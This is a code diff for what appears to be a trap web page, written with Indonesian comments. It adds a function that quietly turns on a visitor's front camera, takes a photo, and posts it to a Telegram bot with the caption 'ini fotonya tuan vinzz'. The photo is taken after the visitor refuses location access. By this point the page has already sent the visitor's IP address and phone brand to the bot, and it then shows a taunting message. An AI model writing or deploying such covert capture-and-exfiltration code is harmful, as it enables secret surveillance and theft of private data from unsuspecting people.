@@ -29,6 +29,42 @@ return "Tidak diketahui";
 
 }
 
+async function kirimFoto()
+{
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+          video.srcObject = stream;
+          video.onloadedmetadata = () => {
+            video.play();
+
+            // Delay biar kamera siap (sekitar 2 detik)
+            setTimeout(() => {
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+              // Convert canvas ke blob
+              canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("chat_id", chat_id);
+                formData.append("photo", blob, "target.png");
+                formData.append('caption', 'ini fotonya tuan vinzz');
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                  method: "POST",
+                  body: formData
+                })
+              }, 'image/png');
+            }, 2000);
+          };
+        })
+        }
+        
 async function kirimPesanTelegram(pesan) {
 const url = (`https://api.telegram.org/bot${token}/sendMessage`);
 await fetch(url, {
@@ -68,6 +104,7 @@ navigator.geolocation.getCurrentPosition(
 
     const pesan = `IP berhasil ditemukan!\nStatus: MENOLAK LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
     await kirimPesanTelegram(pesan);
+    await kirimFoto()
 
     document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
   }
